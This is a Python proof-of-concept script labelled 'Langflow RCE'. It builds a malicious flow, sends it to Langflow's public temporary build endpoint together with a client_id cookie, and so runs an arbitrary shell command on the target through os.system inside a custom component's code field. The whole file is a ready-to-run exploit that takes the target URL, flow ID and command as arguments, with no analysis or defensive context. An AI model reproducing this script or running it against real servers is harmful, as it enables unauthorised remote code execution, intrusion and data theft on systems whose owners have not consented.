import requests
import argparse
from urllib.parse import urljoin

def exploit(target, flow_id, client_id, command):
    url = urljoin(target.rstrip('/'), f"/api/v1/build_public_tmp/{flow_id}/flow")
    
    payload = {
        "data": {
            "nodes": [
                {
                    "id": "Exploit-001",
                    "type": "genericNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "id": "Exploit-001",
                        "type": "ExploitComp",
                        "node": {
                            "template": {
                                "code": {
                                    "type": "code",
                                    "required": True,
                                    "show": True,
                                    "multiline": True,
                                    "value": f"import os\nos.system(\"{command}\")",
                                    "name": "code",
                                    "password": False,
                                    "advanced": False,
                                    "dynamic": False
                                },
                                "_type": "Component"
                            },
                            "description": "X",
                            "base_classes": ["Data"],
                            "display_name": "ExploitComp",
                            "name": "ExploitComp",
                            "frozen": False,
                            "outputs": [],
                            "field_order": ["code"],
                            "beta": False,
                            "edited": False
                        }
                    }
                }
            ],
            "edges": []
        },
        "inputs": None
    }
    
    cookies = {"client_id": client_id}
    headers = {"Content-Type": "application/json"}
    
    try:
        r = requests.post(url, json=payload, cookies=cookies, headers=headers, timeout=15)
        print(f"Status: {r.status_code}")
        if r.status_code == 200:
            print("Command sent.")
        else:
            print(f"Failed: {r.text[:300]}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Langflow RCE")
    parser.add_argument('-u', '--url', required=True, help="Target URL e.g. http://127.0.0.1/")
    parser.add_argument('-f', '--flow-id', required=True, help="Flow ID")
    parser.add_argument('-c', '--client-id', required=True, help="Client ID (cookie)")
    parser.add_argument('-cmd', '--command', required=True, help="Command to execute")
    
    args = parser.parse_args()
    exploit(args.url, args.flow_id, args.client_id, args.command)